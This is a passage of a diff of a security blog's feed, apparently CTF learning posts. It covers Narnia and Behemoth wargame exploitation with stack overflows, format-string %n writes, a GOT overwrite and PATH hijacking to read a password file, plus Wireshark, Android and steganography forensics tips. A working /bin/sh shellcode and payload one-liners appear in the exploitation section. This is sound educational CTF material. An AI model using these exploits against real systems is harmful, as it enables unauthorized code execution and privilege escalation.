 <figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
 </pre></td><td class='code'><pre><code class=''><span class='line'>for(i=0; blah[i] != '\0'; i++)</span></code></pre></td></tr></table></div></figure>
 It now copies the character from 0xffffd890 reference i.e 0xffffd890 + i value. Suppose it copied the character 0x41. The address becomes 0xffff4190 and now for loop searches from that address until a null character is found.
@@ -2146,7 +2289,7 @@ It now copies the character from 0xffffd890 reference i.e 0xffffd890 + i value. 
 </span><span class='line'>0xffff41a0:   0x00000000  0x00000000  0x00000000  0x00000000
 </span><span class='line'>0xffff41b0:   0x00000000  0x00000000</span></code></pre></td></tr></table></div></figure>
 
-If we can somehow keep/change the blah pointer back to it&#8217;s original value we may overwrite the RET pointer (after 12 bytes). Let&#8217;s see how 0xffffd89c looks when is used
+If we can somehow keep/change the blah pointer back to it's original value we may overwrite the RET pointer (after 12 bytes). Let's see how 0xffffd89c looks when is used
 <figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
 </pre></td><td class='code'><pre><code class=''><span class='line'>`python -c 'print "A"*20 + "\x90\x90\x90\x90" + "A"*12 + "BBBB"'`</span></code></pre></td></tr></table></div></figure>
 <figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
@@ -2176,7 +2319,7 @@ When we used the below with the address, we were able to overwrite the RET by BB
 </span><span class='line'>0xffffd680:   0x41414141  0x41414141  0x41414141  0xffffd89c
 </span><span class='line'>0xffffd690:   0x41414141  0x41414141  0x41414141  0x42424242</span></code></pre></td></tr></table></div></figure>
 
-Let&#8217;s export a shellcode using a environment variable check it&#8217;s address on the stack and redirect the flow of our code to it. Notice the number of NOPs we have put for easy identification plus reachability.
+Let's export a shellcode using a environment variable check it's address on the stack and redirect the flow of our code to it. Notice the number of NOPs we have put for easy identification plus reachability.
 <figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
 </pre></td><td class='code'><pre><code class=''><span class='line'>export EGG=`python -c 'print "\x90"*90 + "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80"'`</span></code></pre></td></tr></table></div></figure>
 
@@ -2230,7 +2373,7 @@ Searching our environment variable we get it at address 0xffffd8d4.
 </span><span class='line'>0xffffd934:   0x6e3d5245  0x696e7261  0x4c003861  0x4f435f53
 </span><span class='line'>0xffffd944:   0x53524f4c  0x3d73723d  0x69643a30  0x3b31303d</span></code></pre></td></tr></table></div></figure>
 
-Let&#8217;s redirect our program to 0xffffd8d4 to get the shell
+Let's redirect our program to 0xffffd8d4 to get the shell
 <figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
 <span class='line-number'>2</span>
 <span class='line-number'>3</span>
@@ -2262,7 +2405,7 @@ Let&#8217;s redirect our program to 0xffffd8d4 to get the shell
 </span><span class='line'>Error in re-setting breakpoint 1: No symbol "func" in current context.
 </span><span class='line'>$ </span></code></pre></td></tr></table></div></figure>
 
-Trying this without gdb didn&#8217;t work because the address of character array changes
+Trying this without gdb didn't work because the address of character array changes
 <figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
 <span class='line-number'>2</span>
 <span class='line-number'>3</span>
@@ -2350,7 +2493,7 @@ For example, below you need the address of secret to write the new value 0x1337b
 </span></code></pre></td></tr></table></div></figure>
 </li>
 
-<li>In another challenge below, It can be easily seen the value of secret can be changed after entering 16 characters + 0xc0deface. As, 0xc0deface can&#8217;t be printed as ASCII characters, you can use python to pass the input.
+<li>In another challenge below, It can be easily seen the value of secret can be changed after entering 16 characters + 0xc0deface. As, 0xc0deface can't be printed as ASCII characters, you can use python to pass the input.
 <figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
 </pre></td><td class='code'><pre><code class='C'><span class='line'><span class="n">python</span> <span class="o">-</span><span class="n">c</span> <span class="err">&#39;</span> <span class="n">print</span> <span class="s">&quot;A&quot;</span> <span class="o">*</span> <span class="mi">16</span> <span class="o">+</span> <span class="s">&quot;</span><span class="se">\xc0\xde\xfa\xce</span><span class="s">&quot;</span><span class="err">&#39;</span> <span class="n">or</span> <span class="n">python</span> <span class="o">-</span><span class="n">c</span> <span class="err">&#39;</span> <span class="n">print</span> <span class="s">&quot;A&quot;</span> <span class="o">*</span> <span class="mi">16</span> <span class="o">+</span> <span class="s">&quot;</span><span class="se">\xce\xfa\xde\xc0</span><span class="s">&quot;</span><span class="err">&#39;</span> <span class="n">based</span> <span class="n">on</span> <span class="n">the</span> <span class="n">endianess</span> <span class="n">of</span> <span class="n">the</span> <span class="n">system</span><span class="p">.</span>
 </span></code></pre></td></tr></table></div></figure>
@@ -2403,12 +2546,12 @@ For example, below you need the address of secret to write the new value 0x1337b
 </span></code></pre></td></tr></table></div></figure></li>
 
 <li>Controlling the EIP:
-In the below challenge, an attacker can use a buffer overflow to take control of the program&#8217;s execution. the return address for the call to vuln function is above buf on the stack, so it can be overwritten with an overflow. this allows an attacker to put nearly any address they desire in place of the return address. in this example, the goal is to call the give_shell function.
+In the below challenge, an attacker can use a buffer overflow to take control of the program's execution. the return address for the call to vuln function is above buf on the stack, so it can be overwritten with an overflow. this allows an attacker to put nearly any address they desire in place of the return address. in this example, the goal is to call the give_shell function.
 <ul>
 <li>We need to find the address of give_shell function which can be done either by using gdb and print give_shell or objdump -d outputfile | grep give_shell.</li>
 <li>To know the EIP offset, you can use cyclic patterns. Use  pattern_create.rb and pattern_offset.rb So pattern_create.rb 100 for instance will create a 100 byte cyclic pattern.</li>
 <li>then you feed this as your input to the vulnerable program and it wil crash. so get the value of EIP at that point.</li>
-<li>Then, we just need to pass the input to the program by ./a.out $(python -c &#8217; print &#8220;A&#8221; * Offset + &#8220;Address of give_shell in hex&#8221;&#8217; )</li>
+<li>Then, we just need to pass the input to the program by ./a.out $(python -c ' print "A" * Offset + "Address of give_shell in hex"' )</li>
 </ul>
 <figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
 <span class='line-number'>2</span>
@@ -2459,7 +2602,7 @@ If you check the below code, getegid() function shall return the effective group
 If you see, read function read the stdin into the buffer and (function_ptf) buf() function is called which would call anything in the buffer.
 <ul>
 <li>Since, buf will execute anything, we need a shell code to fit in 128 bytes, There are plenty of shellcode (with different platforms and different working)which can be found on <a href="http://shell-storm.org/shellcode/">Shell-Storm</a>.</li>
-<li>Then, we just need to pass the input to the program by ./a.out $(python -c &#8217; print &#8220;A&#8221; * Offset + &#8220;Address of give_shell in hex&#8221;&#8217; )</li>
+<li>Then, we just need to pass the input to the program by ./a.out $(python -c ' print "A" * Offset + "Address of give_shell in hex"' )</li>
 </ul>
 
 <figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
@@ -2577,7 +2720,7 @@ From the code provided we can see that there’s a buffer overflow in the vuln()
 
 <ol>
 
-<li> Let&#8217;s see a simple example of a format string vulnerabilty. <strong>Narnia5</strong>
+<li> Let's see a simple example of a format string vulnerabilty. <strong>Narnia5</strong>
 <figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
 <span class='line-number'>2</span>
 <span class='line-number'>3</span>
@@ -2623,7 +2766,7 @@ From the code provided we can see that there’s a buffer overflow in the vuln()
 </span><span class='line'>  <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
 </span><span class='line'><span class="p">}</span>
 </span></code></pre></td></tr></table></div></figure>
-Let&#8217;s try to see what&#8217;s on stack and if we can put something on stack and change the value of i.
+Let's try to see what's on stack and if we can put something on stack and change the value of i.
 <figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
 <span class='line-number'>2</span>
 <span class='line-number'>3</span>
@@ -2672,7 +2815,7 @@ Let&#8217;s try to see what&#8217;s on stack and if we can put something on stac
 </span><span class='line'>$ </span></code></pre></td></tr></table></div></figure>
 </li>
 
-<li>In this example, let&#8217;s see use of arbitary writing an address <strong>Narnia7</strong>
+<li>In this example, let's see use of arbitary writing an address <strong>Narnia7</strong>
 <figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
 <span class='line-number'>2</span>
 <span class='line-number'>3</span>
@@ -2776,7 +2919,7 @@ Let&#8217;s try to see what&#8217;s on stack and if we can put something on stac
 </span><span class='line'>        <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
 </span><span class='line'><span class="p">}</span>
 </span></code></pre></td></tr></table></div></figure>
-If we see, the program provides us with the address of the ptrf pointer, goodfunction and bad function. The ptrf is assigned the address of goodfunction if we somehow change it to address of the badfunction, we can get a shell. Let&#8217;s run the program and see what are the address we get.
+If we see, the program provides us with the address of the ptrf pointer, goodfunction and bad function. The ptrf is assigned the address of goodfunction if we somehow change it to address of the badfunction, we can get a shell. Let's run the program and see what are the address we get.
 <figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
 <span class='line-number'>2</span>
 <span class='line-number'>3</span>
@@ -2936,7 +3079,7 @@ If you see 0x41414141 is at offset 6.
 
 </li>
 
-<li>Let&#8217;s see another example <strong>Behemoth3</strong> where we have only the assembly code of the program and we exploit this by two methods by overwriting the GOT address or overwriting the return address.
+<li>Let's see another example <strong>Behemoth3</strong> where we have only the assembly code of the program and we exploit this by two methods by overwriting the GOT address or overwriting the return address.
 
 Assembly Source Code:
 <figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
@@ -3001,7 +3144,7 @@ Observed Behavior:
 </span><span class='line'>Welcome, HelloCheck123
 </span><span class='line'>
 </span><span class='line'>aaaand goodbye again.</span></code></pre></td></tr></table></div></figure>
-Well, we tried to provide a very large input to the Identify yourself, but it didn&#8217;t not gave a segmentation fault. Let&#8217;s try format string:
+Well, we tried to provide a very large input to the Identify yourself, but it didn't not gave a segmentation fault. Let's try format string:
 <figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
 <span class='line-number'>2</span>
 <span class='line-number'>3</span>
@@ -3010,14 +3153,14 @@ Well, we tried to provide a very large input to the Identify yourself, but it di
 </span><span class='line'>Identify yourself: Welcome, AAAA.000000c8.f7fcac20.00000000.00000000.f7ffd000.41414141.3830252e
 </span><span class='line'>
 </span><span class='line'>aaaand goodbye again.</span></code></pre></td></tr></table></div></figure>
-Trying simple format string provided us with the offset of our format string. Now we can write almost any address with any value with our input. Before that let&#8217;s put a environment variable shellcode and check it&#8217;s address:
+Trying simple format string provided us with the offset of our format string. Now we can write almost any address with any value with our input. Before that let's put a environment variable shellcode and check it's address:
 <figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
 </pre></td><td class='code'><pre><code class=''><span class='line'>export EGG=`python -c 'print "\x90"*90 + "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80"'`</span></code></pre></td></tr></table></div></figure>
-Let&#8217;s core dump the binary using %s and examine the core. Our shellcode can be reached at 0xffffd8f0
+Let's core dump the binary using %s and examine the core. Our shellcode can be reached at 0xffffd8f0
 
 <ul>
 Either we can 
-<li>overwrite the return address (main+95): Let&#8217;s debug the program set the breakpoint at main+95 and see the value of $esp which would be use to find the return address when binary is executed without gdb. The value is 0xf7e3ba63 and the return address which needed to be overwrriten is 0xffffd65c. Let&#8217;s again core dump the binary to see the return address without gdb.
+<li>overwrite the return address (main+95): Let's debug the program set the breakpoint at main+95 and see the value of $esp which would be use to find the return address when binary is executed without gdb. The value is 0xf7e3ba63 and the return address which needed to be overwrriten is 0xffffd65c. Let's again core dump the binary to see the return address without gdb.
 <figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
 <span class='line-number'>2</span>
 <span class='line-number'>3</span>
@@ -3105,7 +3248,7 @@ We see that the address is present on the stack at the seventh position.
 Otherwise, we can put it on the stack by
 <figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
 </pre></td><td class='code'><pre><code class=''><span class='line'>for i in {1..256};do echo -n "Offset: $i:"; env -i ./format AAAA%$i\$x;echo ;done | grep 4141</span></code></pre></td></tr></table></div></figure>
-What this is doing is &#8220;Extracting particular stack content by &#8220;%$i\$x&#8221;. As we have seen in DMA, $x can be used to extract particular stack content and reading it. $i value changes from 1-256. However, as you add more data, the offset of your original input changes, so go ahead and add 1333 more bytes of data and see what the offset is then. (1337 is what we want to put into secret, and we will have written four bytes (AAAA), so 1333+4 = 1337)
+What this is doing is "Extracting particular stack content by "%$i\$x". As we have seen in DMA, $x can be used to extract particular stack content and reading it. $i value changes from 1-256. However, as you add more data, the offset of your original input changes, so go ahead and add 1333 more bytes of data and see what the offset is then. (1337 is what we want to put into secret, and we will have written four bytes (AAAA), so 1333+4 = 1337)
 <figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
 <span class='line-number'>2</span>
 <span class='line-number'>3</span>
@@ -3138,7 +3281,7 @@ Otherwise as the address at the seventh is already present on stack we can also 
 We used DMA to access the memory, so written 1337 directly at the address pointed by the 7th position. Otherwise, we can use the basic 
 <figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
 </pre></td><td class='code'><pre><code class=''><span class='line'>./format %08x.%08x.%08x.%08x.%08x.%1292u%n</span></code></pre></td></tr></table></div></figure>
-If you see, we did 5 stack pop-up by using %08x, written the value to be written at 6th position and 7th position contains the address of secret. If you further see &#8220;%08x.&#8221; is of eight characters + 1 of &#8220;.&#8221; or 9 bytes, used five times i.e 9*5=45 bytes and 1292+45 == 1337.
+If you see, we did 5 stack pop-up by using %08x, written the value to be written at 6th position and 7th position contains the address of secret. If you further see "%08x." is of eight characters + 1 of "." or 9 bytes, used five times i.e 9*5=45 bytes and 1292+45 == 1337.
 
 </li>
 
@@ -3205,7 +3348,7 @@ In another example below,
 </span><span class='line'>        <span class="n">puts</span><span class="p">(</span><span class="s">&quot;Length was too long!&quot;</span><span class="p">);</span>
 </span><span class='line'><span class="p">}</span>
 </span></code></pre></td></tr></table></div></figure>
-This program tries to prevent buffer overflows by first asking for the input length. It disregards the rest of the ouput. However, the program uses scanf. If we supply -1 as the length, we can bypass the overflow check: readelf -l no_overflow can be used to find if there&#8217;s any protection on the binary. Stack is executable, Furthermore, ASLR is not enabled. This makes it easy to stick in a shellcode plus a NOP sled and return to an address on the stack
+This program tries to prevent buffer overflows by first asking for the input length. It disregards the rest of the ouput. However, the program uses scanf. If we supply -1 as the length, we can bypass the overflow check: readelf -l no_overflow can be used to find if there's any protection on the binary. Stack is executable, Furthermore, ASLR is not enabled. This makes it easy to stick in a shellcode plus a NOP sled and return to an address on the stack
 <figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
 <span class='line-number'>2</span>
 <span class='line-number'>3</span>
@@ -3228,7 +3371,7 @@ This program tries to prevent buffer overflows by first asking for the input len
 </li>
 
 <li>
-In an another example where stack is not executable, If you read the code, you would find, we need to change the file_name from not_the_flag.txt to flag.txt. In this example, they provided the address of the string &#8220;not_the_flag.txt&#8221; as 0x08048777. By putting a break point in puts in gdb and looking for the address of flag.txt.
+In an another example where stack is not executable, If you read the code, you would find, we need to change the file_name from not_the_flag.txt to flag.txt. In this example, they provided the address of the string "not_the_flag.txt" as 0x08048777. By putting a break point in puts in gdb and looking for the address of flag.txt.
 <figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
 <span class='line-number'>2</span>
 <span class='line-number'>3</span>
@@ -3379,7 +3522,7 @@ We use this in the command line to get the flag
 <span class='line-number'>2</span>
 </pre></td><td class='code'><pre><code class=''><span class='line'>behemoth2@melinda:/behemoth$ ./behemoth2 
 </span><span class='line'>touch: cannot touch '13373': Permission denied</span></code></pre></td></tr></table></div></figure>
-Let&#8217;s see what ltrace provides us
+Let's see what ltrace provides us
 <figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
 <span class='line-number'>2</span>
 <span class='line-number'>3</span>
@@ -3402,7 +3545,7 @@ Let&#8217;s see what ltrace provides us
 </span><span class='line'>--- SIGCHLD (Child exited) ---
 </span><span class='line'>&lt;... system resumed&gt; )                                                                                                 = 256
 </span><span class='line'>sleep(2000</span></code></pre></td></tr></table></div></figure>
-Let&#8217;s see a truncated output of disassemble main, if we see getpid gets the binary pid, sprintf something in some buffer, lstat provides the file status, unlink -call the unlink function to remove the specified file. 
+Let's see a truncated output of disassemble main, if we see getpid gets the binary pid, sprintf something in some buffer, lstat provides the file status, unlink -call the unlink function to remove the specified file. 
 <figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
 <span class='line-number'>2</span>
 <span class='line-number'>3</span>
@@ -3428,7 +3571,7 @@ Let&#8217;s see a truncated output of disassemble main, if we see getpid gets th
 If you check the ltrace output
 <figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
 </pre></td><td class='code'><pre><code class=''><span class='line'>system("touch 14118"touch: cannot touch '14118': Permission denied</span></code></pre></td></tr></table></div></figure>
-touch is being called without an absolute path, so we can take advantage of that. First we’ll create our own touch script that prints out the contents /etc/behemoth_pass/behemoth3. Next, the PATH variable needs to be updated so that it looks at the current working directory first to ensure that our touch script is executed and not the actual touch program. PATH=/tmp:$PATH, you set /tmp to your primary location to search for binaries and the like&#8230; so if you create a file in /tmp/ called touch, it&#8217;ll actually execute that instead of /usr/bin/touch
+touch is being called without an absolute path, so we can take advantage of that. First we’ll create our own touch script that prints out the contents /etc/behemoth_pass/behemoth3. Next, the PATH variable needs to be updated so that it looks at the current working directory first to ensure that our touch script is executed and not the actual touch program. PATH=/tmp:$PATH, you set /tmp to your primary location to search for binaries and the like... so if you create a file in /tmp/ called touch, it'll actually execute that instead of /usr/bin/touch
 <figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
 <span class='line-number'>2</span>
 <span class='line-number'>3</span>
@@ -3451,9 +3594,9 @@ touch is being called without an absolute path, so we can take advantage of that
   
   <entry>
     <title type="html"><![CDATA[Learning From CTF : Forensics]]></title>
-    <link href="http://bitvijays.github.io/blog/2014/11/07/learning-from-ctf-forensics/"/>
-    <updated>2014-11-07T22:07:09+00:00</updated>
-    <id>http://bitvijays.github.io/blog/2014/11/07/learning-from-ctf-forensics</id>
+    <link href="http://bitvijays.github.io/blog/2014/11/08/learning-from-ctf-forensics/"/>
+    <updated>2014-11-08T03:37:09+05:30</updated>
+    <id>http://bitvijays.github.io/blog/2014/11/08/learning-from-ctf-forensics</id>
     <content type="html"><![CDATA[<p>This post (Work in Progress) lists the tips and tricks while doing Forensics challenges during various CTF&rsquo;s.</p>
 
 <!-- more -->
@@ -3476,20 +3619,23 @@ touch is being called without an absolute path, so we can take advantage of that
 
 <li>Wireshark - Searching for answers in pcap file? 
 <ul>
-<li>Searching passwords in HTTP Web traffic in wireshark? http.request.method == &#8220;POST&#8221; filter might help, based on concept that server is asking for LOGIN prompt and user is POSTing his password in cleartext.</li>
-<li>If the challenge says IP address has been spoofed, then you should look for MAC address as it wouldn&#8217;t have changed. You would find packets with two different IP address having same MAC address. In another scenario, if the MAC address has been spoofed, IP address might be the same. In both cases display filter &#8220;arp&#8221; (to only show arp requests) and &#8220;ip.addr==<IP address>&#8221; (to show only packets with either source or destination being the IP address). might be helpful.</li>
-<li>Sometimes, it is better to check which objects we are able to export, (File &#8211;> Export Objects &#8211;> HTTP/DICOM/SMB/SMB2) export the http/DICOM/SMB/SMB2 object </li>
+<li>Searching passwords in HTTP Web traffic in wireshark? http.request.method == "POST" filter might help, based on concept that server is asking for LOGIN prompt and user is POSTing his password in cleartext.</li>
+<li>If the challenge says IP address has been spoofed, then you should look for MAC address as it wouldn't have changed. You would find packets with two different IP address having same MAC address. In another scenario, if the MAC address has been spoofed, IP address might be the same. In both cases display filter "arp" (to only show arp requests) and "ip.addr==<IP address>" (to show only packets with either source or destination being the IP address). might be helpful.</li>
+<li>Sometimes, it is better to check which objects we are able to export, (File --> Export Objects --> HTTP/DICOM/SMB/SMB2) export the http/DICOM/SMB/SMB2 object </li>
 <li>Sometimes, you need to find all the unique ip address in the network capture, for that you can use 
 <figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
 <span class='line-number'>2</span>
 <span class='line-number'>3</span>
 <span class='line-number'>4</span>
 <span class='line-number'>5</span>
+<span class='line-number'>6</span>
 </pre></td><td class='code'><pre><code class=''><span class='line'>tshark -T fields -e ip.src -r &lt; pcap file&gt; | sort | uniq
 </span><span class='line'>
-</span><span class='line'>-T             : Set the format of the output when viewing decoded packet data.
-</span><span class='line'>-e &lt;field&gt;     : Add a field to the list of fields to display if -T fields is selected.
-</span><span class='line'>-r &lt;pcap file&gt; : Read packet data from infile, can be any supported capture file format (including gzipped files). </span></code></pre></td></tr></table></div></figure></li>
+</span><span class='line'>-T fields|pdml|ps|psml|text : Set the format of the output when viewing decoded packet data.
+</span><span class='line'>-e &lt;field&gt;              : Add a field to the list of fields to display if -T fields is selected.
+</span><span class='line'>-r &lt;pcap file&gt;          : Read packet data from infile, can be any supported capture file format (including gzipped files).
+</span><span class='line'>-R &lt;Read filter&gt;            : Cause the specified filter (which uses the syntax of read/display filters, rather than that of capture filters) to be applied</span></code></pre></td></tr></table></div></figure></li>
+<li>wireshark can not reassamble HTTP fragmented packets to generate the RAW data,we can use Dshell to reassemble http partial contents. A blog mentioning how to do it is <a href="https://github.com/naijim/blog/blob/master/writeups/asis-quals-ctf-2015_broken_heart_writeup.md">here</a></li>
 </ul>
 </li>
 <br>
@@ -3503,7 +3649,7 @@ It is used to decode resources to nearly original form (including resources.arsc
 <span class='line-number'>2</span>
 </pre></td><td class='code'><pre><code class=''><span class='line'>apktool d file.apk output-dir
 </span><span class='line'>d : decode to output-dir</span></code></pre></td></tr></table></div></figure>
-apktool converts the apk file in to smali format. smali/baksmali is an assembler/disassembler for the dex format used by dalvik, Android&#8217;s Java VM implementation.
+apktool converts the apk file in to smali format. smali/baksmali is an assembler/disassembler for the dex format used by dalvik, Android's Java VM implementation.
 </li>
 <li>Dex2jar: To see the java code (approx)
 <figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
@@ -3520,7 +3666,7 @@ apktool converts the apk file in to smali format. smali/baksmali is an assembler
 </span><span class='line'>6. This would provide you with .class files which could be open by jd-gui (Java Decompiler) tool. </span></code></pre></td></tr></table></div></figure>
 </li>
 
-<li>Use online services such as <a href="http://www.decompileandroid.com/">Decompile Android</a>. Once it&#8217;s decompiled, we can download the decompiled files and unpack them. </li>
+<li>Use online services such as <a href="http://www.decompileandroid.com/">Decompile Android</a>. Once it's decompiled, we can download the decompiled files and unpack them. </li>
 
 </ul>
 </li>
@@ -3531,22 +3677,22 @@ apktool converts the apk file in to smali format. smali/baksmali is an assembler
 <br>
 <li>If you are looking for <b>hidden flag in an image</b> first check with file, exiftool command, and make sure the extension is correctly displayed. After that check the image file with hexdump -C and look for interesting pattern may be? If you get 7z or PK they represent Zipped files. If so, you can extract those file with 7z x <image_file>. If somehow, you get a passphrase for the image, then you might have to use steghide tool as it allows to hide data with a passphrase.</li>
 <br>
-<li>Sometimes, if you extract some files, if you wuld see a blank name, you know there is some file but can&#8217;t see a name, like file name could be spaces?, then 
+<li>Sometimes, if you extract some files, if you wuld see a blank name, you know there is some file but can't see a name, like file name could be spaces?, then 
 <figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
 <span class='line-number'>2</span>
 </pre></td><td class='code'><pre><code class=''><span class='line'>ls -lb might be of help.
 </span><span class='line'>-b, --escape :   print C-style escapes for nongraphic characters
 </span></code></pre></td></tr></table></div></figure> 
 
-How to open a filename named &#8220;-&#8221;
+How to open a filename named "-"
 
-We can create a file named &#8220;-&#8221; by 
+We can create a file named "-" by 
 <figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
 </pre></td><td class='code'><pre><code class=''><span class='line'>echo hello &gt; -</span></code></pre></td></tr></table></div></figure>
 and this file can be opened by
 <figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
 </pre></td><td class='code'><pre><code class=''><span class='line'>cat ./-</span></code></pre></td></tr></table></div></figure>
-This is needed because lot of programs use &#8220;-&#8221; to mean stdin/stdout.
+This is needed because lot of programs use "-" to mean stdin/stdout.
 </li>
 
 <li>If you have a hex dump of something and you want to create the binary version of the data?
@@ -3555,7 +3701,32 @@ This is needed because lot of programs use &#8220;-&#8221; to mean stdin/stdout.
 </pre></td><td class='code'><pre><code class=''><span class='line'>xxd -r &lt;data&gt;
 </span><span class='line'>&lt;data&gt; is the hexdump of the binary file.</span></code></pre></td></tr></table></div></figure> </li>
 
+<li>Excel Document: You may try unzipping it and check VBA macros in it. There are tools to extract VBA from excel listed here <a href="http://www.decalage.info/vba_tools">ools to extract VBA Macro source code from MS Office Documents
+</a> </li>
+<li> Correct Headers:
+SQLite3
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>0000000: 5351 4c69 7465 2066 6f72 6d61 7420 3300  SQLite format 3.
+</span><span class='line'>0000010: 0400 0101 0040 2020 0000 000b 0000 000b  .....@  ........
+</span><span class='line'>0000020: 0000 0000 0000 0000 0000 0002 0000 0004  ................</span></code></pre></td></tr></table></div></figure>
 
+</li>
+
+<li>GIF to JPG
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>convert animation.gif target.png</span></code></pre></td></tr></table></div></figure></li>
+<li>If the pdf-parser contains
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>    /ProcSet [/PDF/Text/ImageC/ImageI]
+</span><span class='line'>    /ProcSet [/PDF/Text/ImageC/ImageI]</span></code></pre></td></tr></table></div></figure>
+It means it will contain text which can be extracted by using
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>pdf2txt Untitled-1_1a110935ec70b63ad09fec68c89dfacb.pdf 
+</span><span class='line'>PCTF{how_2_pdf_yo}</span></code></pre></td></tr></table></div></figure></li>
 </ol>
 
 
@@ -3565,9 +3736,9 @@ This is needed because lot of programs use &#8220;-&#8221; to mean stdin/stdout.
   
   <entry>
     <title type="html"><![CDATA[Learning From CTF : Cryptography]]></title>
-    <link href="http://bitvijays.github.io/blog/2014/11/07/learning-from-ctf-cryptography/"/>
-    <updated>2014-11-07T19:25:31+00:00</updated>
-    <id>http://bitvijays.github.io/blog/2014/11/07/learning-from-ctf-cryptography</id>
+    <link href="http://bitvijays.github.io/blog/2014/11/08/learning-from-ctf-cryptography/"/>
+    <updated>2014-11-08T00:55:31+05:30</updated>
+    <id>http://bitvijays.github.io/blog/2014/11/08/learning-from-ctf-cryptography</id>
     <content type="html"><![CDATA[<p>This post (Work in Progress) lists the tips and tricks while doing Cryptography challenges during various CTF&rsquo;s.</p>
 
 <!-- more -->
@@ -3586,9 +3757,9 @@ This is needed because lot of programs use &#8220;-&#8221; to mean stdin/stdout.
   
   <entry>
     <title type="html"><![CDATA[Learning From CTF : Web Exploitation]]></title>
-    <link href="http://bitvijays.github.io/blog/2014/11/06/learning-from-ctf-web-exploitation/"/>
-    <updated>2014-11-06T19:02:50+00:00</updated>
-    <id>http://bitvijays.github.io/blog/2014/11/06/learning-from-ctf-web-exploitation</id>
+    <link href="http://bitvijays.github.io/blog/2014/11/07/learning-from-ctf-web-exploitation/"/>
+    <updated>2014-11-07T00:32:50+05:30</updated>
+    <id>http://bitvijays.github.io/blog/2014/11/07/learning-from-ctf-web-exploitation</id>
     <content type="html"><![CDATA[<p>This post (Work in Progress) lists the tips and tricks while doing Web Exploitation challenges during various CTF&rsquo;s.</p>
 
 <!-- more -->
